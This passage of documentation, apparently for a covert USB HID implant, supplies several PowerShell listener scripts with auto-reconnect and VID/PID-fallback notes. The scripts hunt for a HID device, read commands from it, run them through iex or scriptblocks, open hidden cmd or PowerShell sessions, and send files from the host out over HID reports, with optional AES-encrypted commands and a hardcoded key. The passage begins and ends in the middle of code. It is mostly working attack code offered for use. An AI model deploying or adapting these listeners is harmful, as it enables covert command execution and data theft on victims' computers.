Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)}$a.Key=$k;$a.IV=$v;return(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
$d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0;if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}else{try{$o=(iex $c 2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}Sleep -M 5}
```

---

### Feature Report Interactive Listener (`feature_report_interactive.ps1`)

Listener with interactive shell sessions (cmd/powershell). Uses Feature Reports.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$MR=20;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if(!$UP-or$c.up-eq$UP){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;F=$c.fl;P=$c.fl-1}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)}[H]::SetupDiDestroyDeviceInfoList($s)>$x}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
$d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0;if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}Sleep -M 5}
```

---

### Output Report Interactive Listener (`output_report_interactive.ps1`)

Listener with interactive shell sessions. Uses Output Reports for higher throughput.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$RU=1000;$MR=20;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if(!$UP-or$c.up-eq$UP){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)}[H]::SetupDiDestroyDeviceInfoList($s)>$x}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){Write-Host "SEND FAIL after $MR retries";break}Sleep -M 5};[H]::U($RU)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
$d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0;if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}Sleep -M 5}
```

---

## Advanced Listener Features

The advanced listeners include additional features for more robust and resilient operation:

### Auto-Reconnect

Advanced listeners automatically detect when the device connection is lost (e.g., due to USB reconnection, system sleep/wake, or device reset) and will continuously attempt to reconnect. The reconnection interval is controlled by the `$RC` parameter (default: 3 seconds).

When connection is lost:
1. The listener detects the failed read operation
2. The existing device handle is closed
3. The listener enters a polling loop, searching for the device every `$RC` seconds
4. Once the device is found, connection is re-established and a "Ready" message is sent

### VID/PID Fallback

Advanced listeners implement a two-tier device matching strategy for maximum flexibility:

**Primary Match (Exact):** First attempts to match the exact VID (`$VI`) and PID (`$PI`) configured in the listener.

**Fallback Match (Parameters):** If no exact VID/PID match is found, the listener falls back to matching based on:
- Usage Page (`$UP` = 0xFF00)
- Usage (`$UG` = 0x01)
- Input Report Length (`$IL` = 64)
- Output Report Length (`$OL` = 64)
- Feature Report Length (`$FL` = 64)

This allows the listener to work with any HID device that has the correct report structure, regardless of the cloned VID/PID. This is particularly useful when operating with different passthrough devices or when the VID/PID may change between deployments.

### Additional Advanced Listener Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `$RC` | `3` | Reconnect interval in seconds |
| `$UG` | `0x01` | Usage ID for fallback matching |
| `$IL` | `64` | Expected Input Report Length for fallback |
| `$OL` | `64` | Expected Output Report Length for fallback |
| `$FL` | `64` | Expected Feature Report Length for fallback |
| `$SD` | `100` | SLOW signal delay in milliseconds (flow control listeners only) |
| `$SSD` | `200` | SLOWER signal delay in milliseconds (flow control listeners only) |

---

### Advanced Feature Report Listener (`advanced_feature_report.ps1`)

Feature Report listener with auto-reconnect and VID/PID fallback. Interactive shell sessions supported.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
